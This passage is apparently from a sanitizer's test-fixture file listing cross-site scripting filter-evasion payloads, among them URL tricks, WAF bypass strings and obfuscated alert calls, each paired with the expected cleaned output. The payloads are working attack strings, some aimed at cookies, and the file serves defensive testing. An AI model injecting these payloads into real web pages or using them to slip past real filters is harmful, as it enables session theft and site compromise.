        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Google "feeling lucky" part 2',
        'example': '<A HREF="http://ha.ckers.org@google">XSS</A>',
        'cleanedHtml': '<a href="http://ha.ckers.org@google">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Google "feeling lucky" part 3',
        'example': '<A HREF="http://google:ha.ckers.org">XSS</A>',
        'cleanedHtml': '<a href="http://google:ha.ckers.org">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Removing cnames',
        'example': '<A HREF="http://google.com/">XSS</A>',
        'cleanedHtml': '<a href="http://google.com/">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Extra dot for absolute DNS',
        'example': '<A HREF="http://www.google.com./">XSS</A>',
        'cleanedHtml': '<a href="http://www.google.com./">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: JavaScript link location',
        'example': '<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>',
        'cleanedHtml': '<a href>XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Content replace as attack vector 1',
        'example': '<A HREF="http://www.google.com/ogle.com/">XSS</A>',
        'cleanedHtml': '<a href="http://www.google.com/ogle.com/">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Content replace as attack vector 2',
        'example': '<IMG SRC="java&#x09;script:alert(\'XSS\');">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Methods to Bypass WAF – Cross-Site Scripting: Reflected XSS in Javascript',
        'example': '<script>setTimeout("writetitle()",$_GET[xss])</script>',
        'cleanedHtml': '&lt;script&gt;setTimeout("writetitle()",$_GET[xss])&lt;/script&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Methods to Bypass WAF – Cross-Site Scripting: DOM-based XSS',
        'example': '<script>eval($_GET[xss]);</script>',
        'cleanedHtml': '&lt;script&gt;eval($_GET[xss]);&lt;/script&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 1',
        'example': '<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 2',
        'example': '<Video> <source onerror = "javascript: alert (XSS)">',
        'cleanedHtml': '<video> <source>',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 3',
        'example': '<Input value = "XSS" type = text>',
        'cleanedHtml': '&lt;Input value = "XSS" type = text&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 4',
        'example': '<applet code="javascript:confirm(document.cookie);">',
        'cleanedHtml': '&lt;applet code="javascript:confirm(document.cookie);"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 5',
        'example': '<isindex x="javascript:" onmouseover="alert(XSS)">',
        'cleanedHtml': '&lt;isindex x="javascript:" onmouseover="alert(XSS)"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 6',
        'example': '"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
        'cleanedHtml': '"&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;',
        'cleanedNoHtml': '"&gt;”&gt;’&gt;'
    }, {
        'label': 'WAF ByPass Strings for XSS 7',
        'example': '"><img src="x:x" onerror="alert(XSS)">',
        'cleanedHtml': '"&gt;<img src>',
        'cleanedNoHtml': '"&gt;'
    }, {
        'label': 'WAF ByPass Strings for XSS 8',
        'example': '"><iframe src="javascript:alert(XSS)">',
        'cleanedHtml': '"&gt;&lt;iframe src="javascript:alert(XSS)"&gt;',
        'cleanedNoHtml': '"&gt;'
    }, {
        'label': 'WAF ByPass Strings for XSS 9',
        'example': '<object data="javascript:alert(XSS)">',
        'cleanedHtml': '&lt;object data="javascript:alert(XSS)"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 10',
        'example': '<isindex type=image src=1 onerror=alert(XSS)>',
        'cleanedHtml': '&lt;isindex type=image src=1 onerror=alert(XSS)&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 11',
        'example': '<img src=x:alert(alt) onerror=eval(src) alt=0>',
        'cleanedHtml': '<img src alt="0">',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 12',
        'example': '<img  src="x:gif" onerror="window[\'al\u0065rt\'](0)"></img>',
        'cleanedHtml': '<img src></img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 13',
        'example': '<iframe/src="data:text/html,<svg onload=alert(1)>">',
        'cleanedHtml': '&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 14',
        'example': '<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
        'cleanedHtml': '&lt;meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 15',
        'example': '<svg><script xlink:href=data&colon;,window.open(\'https://www.google.com/\')></script',
        'cleanedHtml': '&lt;svg&gt;&lt;script xlink:href=data&colon;,window.open(\'https://www.google.com/\')&gt;&lt;/script',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 16',
        'example': '<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">',
        'cleanedHtml': '&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 17',
        'example': '<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>',
        'cleanedHtml': '&lt;iframe src=javascript&colon;alert&lpar;document&period;location&rpar;&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 18',
        'example': '<form><a href="javascript:\u0061lert(1)">X',
        'cleanedHtml': '&lt;form&gt;<a href>X',
        'cleanedNoHtml': 'X'
    }, {
        'label': 'WAF ByPass Strings for XSS 19',
        'example': '</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror=\'eval(src)\'>',
        'cleanedHtml': '&lt;/script&gt;&lt;img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror=\'eval(src)\'&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 20',
        'example': '<style>//*{x:expression(alert(/xss/))}//<style></style>',
        'cleanedHtml': '&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 21',
        'example': '<img src="/" =_=" title="onerror=\'prompt(1)\'">',
        'cleanedHtml': '<img src="/">',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 22',
        'example': '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa ' +
            'href=j&#97v&#97script:&#97lert(1)>ClickMe',
        'cleanedHtml': '<a href>ClickMe',
        'cleanedNoHtml': 'ClickMe'
    }, {
        'label': 'WAF ByPass Strings for XSS 23',
        'example': '<script x> alert(1) </script 1=2',
        'cleanedHtml': '&lt;script x&gt; alert(1) &lt;/script 1=2',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 24',
        'example': '<form><button formaction=javascript&colon;alert(1)>CLICKME',
        'cleanedHtml': '&lt;form&gt;&lt;button formaction=javascript&colon;alert(1)&gt;CLICKME',
        'cleanedNoHtml': 'CLICKME'
    }, {
        'label': 'WAF ByPass Strings for XSS 25',
        'example': '<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"',
        'cleanedHtml': '&lt;input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"',
        'cleanedNoHtml': ''
    }, {
        'label': 'WAF ByPass Strings for XSS 26',
        'example': '<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31' +
            '%29%3C%2F%73%63%72%69%70%74%3E"></iframe>',
        'cleanedHtml': '&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C' +
            '%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter Bypass Alert Obfuscation 1',
        'example': '<IMG onmouseover="(alert)(1)">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter Bypass Alert Obfuscation 2',
        'example': '<IMG onmouseover="a=alert,a(1)">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter Bypass Alert Obfuscation 3',
        'example': '<IMG onmouseover="[1].find(alert)">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter Bypass Alert Obfuscation 4',
        'example': '<IMG onmouseover="top[\'al\'+\'ert\'](1)">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter Bypass Alert Obfuscation 5',
        'example': '<IMG onmouseover="top[/al/.source+/ert/.source](1)">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter Bypass Alert Obfuscation 6',
        'example': '<IMG onmouseover="al\u0065rt(1)">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter Bypass Alert Obfuscation 7',
        'example': '<IMG onmouseover="top[\'al\x65rt\'](1)">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter Bypass Alert Obfuscation 8',
        'example': '<IMG onmouseover="top[8680439..toString(30)](1)">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }];
//# sourceMappingURL=XssFilterEvasionTestCases.js.map